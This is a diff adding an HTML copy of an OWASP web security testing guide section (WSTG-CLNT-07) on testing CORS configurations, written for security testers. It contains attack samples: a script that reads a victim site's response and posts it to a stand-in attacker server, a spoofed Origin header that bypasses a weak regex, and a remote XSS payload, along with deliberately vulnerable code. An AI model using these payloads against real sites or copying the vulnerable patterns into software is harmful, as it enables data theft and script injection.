@@ -1,0 +1,205 @@
+
+
+
+
+
+
+  <sl-details summary="Cors Implementation" open>
+    <h1 id="testing-cross-origin-resource-sharing">Testing Cross Origin Resource Sharing</h1>
+  <table>
+  <thead>
+  <tr>
+  <th>ID</th>
+  </tr>
+  </thead>
+  <tbody>
+  <tr>
+  <td>WSTG-CLNT-07</td>
+  </tr>
+  </tbody>
+  </table>
+  <h2 id="summary">Summary</h2>
+  <p><a href="https://en.wikipedia.org/wiki/Cross-origin_resource_sharing">Cross Origin Resource Sharing</a> (CORS) is a mechanism that enables a web browser to perform cross-domain requests using the XMLHttpRequest (XHR) Level 2 (L2) API in a controlled manner. In the past, the XHR L1 API only allowed requests to be sent within the same origin as it was restricted by the <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">Same Origin Policy</a> (SOP).</p>
+  <p>Cross-origin requests have an <code class="language-plaintext highlighter-rouge">Origin</code> header that identifies the domain initiating the request and is always sent to the server. CORS defines the protocol to use between a web browser and a server to determine whether a cross-origin request is allowed. HTTP <a href="https://en.wikipedia.org/wiki/Cross-origin_resource_sharing#Headers">headers</a> are used to accomplish this.</p>
+  <p>The <a href="https://www.w3.org/TR/cors/">W3C CORS specification</a> mandates that for non simple requests, such as requests other than GET or POST or requests that uses credentials, a pre-flight OPTIONS request must be sent in advance to check if the type of request will have a bad impact on the data. The pre-flight request checks the methods and headers allowed by the server, and if credentials are permitted. Based on the result of the OPTIONS request, the browser decides whether the request is allowed or not.</p>
+  <h3 id="origin--access-control-allow-origin">Origin &amp; Access-Control-Allow-Origin</h3>
+  <p>The <code class="language-plaintext highlighter-rouge">Origin</code> request header is always sent by the browser in a CORS request and indicates the origin of the request. The Origin header cannot be changed from JavaScript as <a href="https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name">the browser (the user-agent) blocks its modification</a>; however, relying on this header for Access Control checks is not a good idea as it may be spoofed outside the browser, for example by using a proxy, so you still need to check that application-level protocols are used to protect sensitive data.</p>
+  <p><code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin</code> is a response header used by a server to indicate which domains are allowed to read the response. Based on the CORS W3 Specification it is up to the client to determine and enforce the restriction of whether the client has access to the response data based on this header.</p>
+  <p>From a security testing perspective you should look for insecure configurations as for example using a <code class="language-plaintext highlighter-rouge">*</code> wildcard as value of the <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin</code> header that means all domains are allowed. Another insecure example is when the server returns back the origin header without any additional checks, which can lead to access of sensitive data. Note that the configuration of allowing cross-origin requests is very insecure and is not acceptable in general terms, except in the case of a public API that is intended to be accessible by everyone.</p>
+  <h3 id="access-control-request-method--access-control-allow-method">Access-Control-Request-Method &amp; Access-Control-Allow-Method</h3>
+  <p>The <code class="language-plaintext highlighter-rouge">Access-Control-Request-Method</code> header is used when a browser performs a preflight OPTIONS request and lets the client indicate the request method of the final request. On the other hand, the <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Method</code> is a response header used by the server to describe the methods the clients are allowed to use.</p>
+  <h3 id="access-control-request-headers--access-control-allow-headers">Access-Control-Request-Headers &amp; Access-Control-Allow-Headers</h3>
+  <p>These two headers are used between the browser and the server to determine which headers can be used to perform a cross-origin request.</p>
+  <h3 id="access-control-allow-credentials">Access-Control-Allow-Credentials</h3>
+  <p>This response header allows browsers to read the response when credentials are passed. When the header is sent, the web application must set an origin to the value of the <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin</code> header. The <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Credentials</code> header cannot be used along with the <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin</code> header whose value is the <code class="language-plaintext highlighter-rouge">*</code> wildcard like the following:</p>
+  <div class="language-http highlighter-rouge">
+  <div class="highlight">
+  <pre class="highlight"><code><span class="err">Access-Control-Allow-Origin: *
+  Access-Control-Allow-Credentials: true
+  </span></code></pre>
+  </div>
+  </div>
+  <h3 id="input-validation">Input Validation</h3>
+  <p>XHR L2 introduces the possibility of creating a cross-domain request using the XHR API for backwards compatibility. This can introduce security vulnerabilities that in XHR L1 were not present. Interesting points of the code to exploit would be URLs that are passed to XMLHttpRequest without validation, specially if absolute URLs are allowed because that could lead to code injection. Likewise, other part of the application that can be exploited is if the response data is not escaped and we can control it by providing user-supplied input.</p>
+  <h3 id="other-headers">Other Headers</h3>
+  <p>There are other headers involved like <code class="language-plaintext highlighter-rouge">Access-Control-Max-Age</code> that determines the time a preflight request can be cached in the browser, or <code class="language-plaintext highlighter-rouge">Access-Control-Expose-Headers</code> that indicates which headers are safe to expose to the API of a CORS API specification.</p>
+  <p>To review CORS headers, refer to the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#The_HTTP_response_headers">CORS MDN document</a>.</p>
+  <h2 id="test-objectives">Test Objectives</h2>
+  <ul>
+  <li>Identify endpoints that implement CORS.</li>
+  <li>Ensure that the CORS configuration is secure or harmless.</li>
+  </ul>
+  <h2 id="how-to-test">How to Test</h2>
+  <p>A tool such as <a href="https://www.zaproxy.org">ZAP</a> can enable testers to intercept HTTP headers, which can reveal how CORS is used. Testers should pay particular attention to the origin header to learn which domains are allowed. Also, in some cases, manual inspection of the JavaScript is needed to determine whether the code is vulnerable to code injection due to improper handling of user supplied input.</p>
+  <h3 id="cors-misconfiguration">CORS Misconfiguration</h3>
+  <p>Setting the wildcard to the <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin header</code> (that is, <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin: *</code>) is not secure if the response contains sensitive information. Although it cannot be used with the <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Credentials: true</code> at the same time, it can be dangerous where the access control is done solely by the firewall rules or the source IP addresses, other than being protected by credentials.</p>
+  <h4 id="wildcard-access-control-allow-origin">Wildcard Access-Control-Allow-Origin</h4>
+  <p>A tester can check if the <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin: *</code> exists in the HTTP response messages.</p>
+  <div class="language-http highlighter-rouge">
+  <div class="highlight">
+  <pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+  <span class="s">[...]</span>
+  <span class="na">Access-Control-Allow-Origin</span><span class="p">:</span> <span class="s">*</span>
+  <span class="na">Content-Length</span><span class="p">:</span> <span class="s">4</span>
+  <span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/xml</span>
+
+  [Response Body]
+  </code></pre>
+  </div>
+  </div>
+  <p>If a response contains sensitive data, an attacker can steal it through the usage of XHR:</p>
+  <div class="language-html highlighter-rouge">
+  <div class="highlight">
+  <pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+      <span class="nt">&lt;head&gt;&lt;/head&gt;</span>
+      <span class="nt">&lt;body&gt;</span>
+          <span class="nt">&lt;script&gt;</span>
+              <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+              <span class="nx">xhr</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+                  <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
+                      <span class="kd">var</span> <span class="nx">xhr2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+                      <span class="c1">// attacker.server: attacker listener to steal response</span>
+                      <span class="nx">xhr2</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://attacker.server</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+                      <span class="nx">xhr2</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
+                  <span class="p">}</span>
+              <span class="p">};</span>
+              <span class="c1">// victim.site: vulnerable server with `Access-Control-Allow-Origin: *` header </span>
+              <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://victim.site</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+              <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+          <span class="nt">&lt;/script&gt;</span>
+      <span class="nt">&lt;/body&gt;</span>
+  <span class="nt">&lt;/html&gt;</span>
+  </code></pre>
+  </div>
+  </div>
+  <h4 id="dynamic-cors-policy">Dynamic CORS Policy</h4>
+  <p>A modern web application or API may be implemented to allow cross-origin requests dynamically, generally in order to allow the requests from the sub domains like the following:</p>
+  <div class="language-php highlighter-rouge">
+  <div class="highlight">
+  <pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'|\.example.com$|'</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'SERVER_NAME'</span><span class="p">]))</span> <span class="p">{</span>
+     <span class="nb">header</span><span class="p">(</span><span class="s2">"Access-Control-Allow-Origin: </span><span class="si">{</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_ORIGIN'</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span><span class="p">);</span>
+     <span class="mf">...</span>
+  <span class="p">}</span>
+  </code></pre>
+  </div>
+  </div>
+  <p>In this example, all the requests from the subdomains of example.com will be allowed. It must be ensured that the regular expression that is used to match is complete. Otherwise, if it was simply matched with <code class="language-plaintext highlighter-rouge">example.com</code> (without <code class="language-plaintext highlighter-rouge">$</code> appended), attackers might be able to bypass the CORS policy by appending their domain to the <code class="language-plaintext highlighter-rouge">Origin</code> header.</p>
+  <div class="language-http highlighter-rouge">
+  <div class="highlight">
+  <pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/test.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+  <span class="na">Host</span><span class="p">:</span> <span class="s">example.com</span>
+  <span class="s">[...]</span>
+  <span class="na">Origin</span><span class="p">:</span> <span class="s">http://example.com.attacker.com</span>
+  <span class="na">Cookie</span><span class="p">:</span> <span class="s">&lt;session cookie&gt;</span>
+  </code></pre>
+  </div>
+  </div>
+  <p>When the request above is sent, if the following response is returned with the <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin</code> whose value is the same as the attacker&rsquo;s input, the attacker can read the response afterwards and access sensitive information that is only accessible by a victim user.</p>
+  <div class="language-http highlighter-rouge">
+  <div class="highlight">
+  <pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+  <span class="s">[...]</span>
+  <span class="na">Access-Control-Allow-Origin</span><span class="p">:</span> <span class="s">http://example.com.attacker.com</span>
+  <span class="na">Access-Control-Allow-Credentials</span><span class="p">:</span> <span class="s">true</span>
+  <span class="na">Content-Length</span><span class="p">:</span> <span class="s">4</span>
+  <span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/xml</span>
+
+  [Response Body]
+  </code></pre>
+  </div>
+  </div>
+  <h3 id="input-validation-weakness">Input Validation Weakness</h3>
+  <p>The CORS concept can be viewed from a completely different angle. An attacker may allow their CORS policy on purpose to inject code to the target web application.</p>
+  <h4 id="remote-xss-with-cors">Remote XSS with CORS</h4>
+  <p>This code makes a request to the resource passed after the <code class="language-plaintext highlighter-rouge">#</code> character in the URL, initially used to get resources in the same server.</p>
+  <p>Vulnerable code:</p>
+  <div class="language-html highlighter-rouge">
+  <div class="highlight">
+  <pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
+      <span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+
+      <span class="nx">req</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+          <span class="k">if</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">readyState</span><span class="o">==</span><span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">status</span><span class="o">==</span><span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
+              <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">div1</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span><span class="o">=</span><span class="nx">req</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
+          <span class="p">}</span>
+      <span class="p">}</span>
+
+      <span class="kd">var</span> <span class="nx">resource</span> <span class="o">=</span> <span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+      <span class="nx">req</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span><span class="nx">resource</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
+      <span class="nx">req</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+  <span class="nt">&lt;/script&gt;</span>
+
+  <span class="nt">&lt;body&gt;</span>
+      <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"div1"</span><span class="nt">&gt;&lt;/div&gt;</span>
+  <span class="nt">&lt;/body&gt;</span>
+  </code></pre>
+  </div>
+  </div>
+  <p>For example, a request like this will show the contents of the <code class="language-plaintext highlighter-rouge">profile.php</code> file:</p>
+  <p><code class="language-plaintext highlighter-rouge">http://example.foo/main.php#profile.php</code></p>
+  <p>Request and response generated by <code class="language-plaintext highlighter-rouge">http://example.foo/profile.php</code>:</p>
+  <div class="language-html highlighter-rouge">
+  <div class="highlight">
+  <pre class="highlight"><code>GET /profile.php HTTP/1.1
+  Host: example.foo
+  [...]
+  Referer: http://example.foo/main.php
+  Connection: keep-alive
+
+  HTTP/1.1 200 OK
+  [...]
+  Content-Length: 25
+  Content-Type: text/html
+
+  [Response Body]
+  </code></pre>
+  </div>
+  </div>
+  <p>Now, as there is no URL validation we can inject a remote script, that will be injected and executed in the context of the <code class="language-plaintext highlighter-rouge">example.foo</code> domain, with a URL like this:</p>
+  <div class="language-text highlighter-rouge">
+  <div class="highlight">
+  <pre class="highlight"><code>http://example.foo/main.php#http://attacker.bar/file.php
+  </code></pre>
+  </div>
+  </div>
+  <p>Request and response generated by <code class="language-plaintext highlighter-rouge">http://attacker.bar/file.php</code>:</p>
+  <div class="language-html highlighter-rouge">
+  <div class="highlight">
+  <pre class="highlight"><code>GET /file.php HTTP/1.1
+  Host: attacker.bar
+  [...]
+  Referer: http://example.foo/main.php
+  origin: http://example.foo
+
+  HTTP/1.1 200 OK
+  [...]
+  Access-Control-Allow-Origin: *
+  Content-Length: 92
+  Content-Type: text/html
+
+  Injected Content from attacker.bar <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"#"</span> <span class="na">onerror=</span><span class="s">"alert('Domain: '+document.domain)"</span><span class="nt">&gt;</span>
+  </code></pre>
+  </div>
+  </div>
+</sl-details>
+</br>
